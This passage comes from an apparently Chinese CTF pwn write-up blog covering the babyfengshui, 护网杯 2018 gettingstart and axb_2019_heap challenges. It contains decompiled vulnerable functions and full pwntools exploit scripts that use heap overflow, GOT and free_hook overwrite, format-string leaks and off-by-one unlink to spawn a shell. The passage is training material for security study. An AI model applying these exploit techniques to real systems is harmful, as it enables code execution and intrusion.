0x80</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>3.申请新的结构体，其description部分为0x100，根据linux堆的性质，会优先分配空闲的堆块，释放得到的空闲堆块可以满足description的空间需求，而node的空间需要新分配，得到下面的结构：</p><table><thead><tr><th align="right">堆块0 des 0x100</th><th>堆块1 des 0x80</th><th>堆块1 node 0x80</th><th>堆块2 des 0x8</th><th>堆块2 node 0x80</th><th>堆块0 node 0x80</th></tr></thead><tbody><tr><td align="right"></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>之后绕过只需要des的大小输入中间跨过的堆的大小就能实现堆溢出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./babyfengshui_1&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28996</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, length, text=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size of description: &#x27;</span>,tbs(size))</span><br><span class="line">    sla(<span class="string">&#x27;name: &#x27;</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;text length: &#x27;</span>,tbs(length))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, text</span>):</span><br><span class="line">    sla(<span class="string">&quot;Action: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;length: &#x27;</span>,tbs(length))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="number">0x8</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x19c</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr=u32(r(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">f&quot;free_addr==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(free_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">f&quot;system_addr===&gt;<span class="subst">&#123;<span class="built_in">hex</span>(sys_addr)&#125;</span>&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(sys_addr))</span><br><span class="line">debug()</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>至少本地通了（汗，远程太old了</p><h1 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a>护网杯_2018_gettingstart</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v5 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v6 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %lu seconds...\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But Whether it starts depends on you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0x7FFFFFFFFFFFFFFF</span>LL &amp;&amp; v6 == <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %g seconds...\n&quot;</span>, v6);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>算是一个趣味题，是覆盖v5为7FFF…FFF然后覆盖v6为0.1就可以getshell，主要是v6的double型转换比较复杂（千万不要用gpt做这种工作。。。。。</p><p>浮点型：<a href="https://tooltt.com/floatconverter/">https://tooltt.com/floatconverter/</a></p><p>就有exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">path=<span class="string">&#x27;start&#x27;</span></span><br><span class="line">p=process(path)</span><br><span class="line"></span><br><span class="line">pay=<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3FB999999999999A</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;But Whether it starts depends on you.\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653176.png" alt="image-20240508185905256" style="zoom:50%;" /><p>满保护</p><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  banner();                                     <span class="comment">// 有个格式化字符串漏洞</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;None!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No such choices!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是一个菜单堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to note management system!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, format);                 <span class="comment">// 一个栈溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n-------------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>banner函数中有一个栈溢出和格式化字符串漏洞，但是由于Canary的保护，他是无法进行栈溢出的，因此只能泄露了，而泄露的话一次性泄露code基址和libc基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0xB</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( counts &gt; <span class="number">0xA</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter a size:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="keyword">if</span> ( key == <span class="number">43</span> )                            <span class="comment">// 用格式化字符串漏洞改key为43</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter the content: &quot;</span>);</span><br><span class="line">      v0 = index;</span><br><span class="line">      *((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)v0) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *((_DWORD *)&amp;note + <span class="number">4</span> * (<span class="type">int</span>)index + <span class="number">2</span>) = size;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index) )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;error&quot;</span>, <span class="number">1uLL</span>, <span class="number">5uLL</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 不改key只能进行这个</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t hack me!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter the content: &quot;</span>);</span><br><span class="line">      v1 = index;</span><br><span class="line">      *((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)v1) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *((_DWORD *)&amp;note + <span class="number">4</span> * (<span class="type">int</span>)index + <span class="number">2</span>) = size;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index) )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;error&quot;</span>, <span class="number">1uLL</span>, <span class="number">5uLL</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)check_pass((<span class="type">char</span> *)&amp;note + <span class="number">16</span> * (<span class="type">int</span>)index) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;go out!hacker!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    get_input(*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index), size);<span class="comment">// off by one</span></span><br><span class="line">    ++counts;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t hack me!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中漏洞点在于get_input函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">get_input</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (_BYTE *)(v3 + a1);</span><br><span class="line">    result = fread(v4, <span class="number">1uLL</span>, <span class="number">1uLL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v3 + a1;</span><br><span class="line">        *v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="type">unsigned</span> <span class="type">int</span>)++v3;</span><br><span class="line">      <span class="keyword">if</span> ( a2 + <span class="number">1</span> &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)v3 )         <span class="comment">// off by one，写了a2+1个字节</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个off-by-one</p><p>这样还有edit，delete可以有思路即unlink改free_hook为system，之后free(‘&#x2F;bin&#x2F;sh\x00’)即可（但是好像(lll￢ω￢)key没用到）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./axb&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span 